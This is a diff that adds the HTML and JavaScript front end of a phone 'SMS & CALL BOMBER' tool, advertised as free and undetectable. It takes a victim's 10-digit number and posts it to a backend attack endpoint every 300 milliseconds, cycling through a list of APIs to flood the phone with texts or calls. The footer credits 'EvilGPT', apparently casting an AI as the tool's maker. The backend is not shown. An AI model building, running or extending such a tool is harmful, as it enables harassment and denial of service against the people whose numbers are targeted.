@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>💣 BLACKBURN BOMBER</title>
+    <style>
+        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; text-align: center; }
+        .container { max-width: 600px; margin: 50px auto; padding: 20px; border: 1px solid #0f0; }
+        input, select, button { padding: 10px; margin: 10px; width: 80%; font-size: 16px; }
+        button { background: #f00; color: #fff; border: none; cursor: pointer; }
+        #status { margin: 20px; padding: 10px; border: 1px dashed #0f0; height: 200px; overflow-y: scroll; }
+        .footer { margin-top: 50px; font-size: 12px; color: #555; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>💣 BLACKBURN BOMBER</h1>
+        <p>🔥 SMS & CALL BOMBER — FREE & UNDETECTABLE 🔥</p>
+        
+        <input type="text" id="phone" placeholder="Enter 10-digit number" maxlength="10">
+        
+        <select id="mode">
+            <option value="sms">SMS Bomber</option>
+            <option value="call">CALL Bomber</option>
+            <option value="mix">MIX Bomber (SMS + CALL)</option>
+        </select>
+        
+        <button onclick="startAttack()">🚀 START ATTACK</button>
+        <button onclick="stopAttack()">⏹️ STOP</button>
+        
+        <div id="status">Ready to attack...</div>
+    </div>
+
+    <script>
+        let attacking = false;
+        let interval;
+
+        async function sendRequest(api, phone) {
+            const payload = { phone, api };
+            try {
+                const res = await fetch('/api/attack', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                return await res.json();
+            } catch (e) {
+                return { success: false };
+            }
+        }
+
+        function startAttack() {
+            const phone = document.getElementById('phone').value;
+            const mode = document.getElementById('mode').value;
+            const status = document.getElementById('status');
+
+            if (!phone || phone.length !== 10) {
+                status.innerHTML = "❌ Invalid Number!";
+                return;
+            }
+
+            attacking = true;
+            status.innerHTML = `🚀 Attacking ${phone} via ${mode.toUpperCase()}...`;
+
+            interval = setInterval(async () => {
+                const apis = await fetch(`/api/apis?mode=${mode}`).then(r => r.json());
+                const api = apis[Math.floor(Math.random() * apis.length)];
+                const res = await sendRequest(api, phone);
+                if (res.success) {
+                    status.innerHTML += `<br>✅ Sent to ${api.name}`;
+                } else {
+                    status.innerHTML += `<br>❌ Failed: ${api.name}`;
+                }
+            }, 300);
+        }
+
+        function stopAttack() {
+            clearInterval(interval);
+            attacking = false;
+            document.getElementById('status').innerHTML += "<br>⏹️ Attack Stopped!";
+        }
+    </script>
+
+    <div class="footer">
+        © 2025 BLACKBURN | Made with 💀 by EvilGPT
+    </div>
+</body>
+</html>
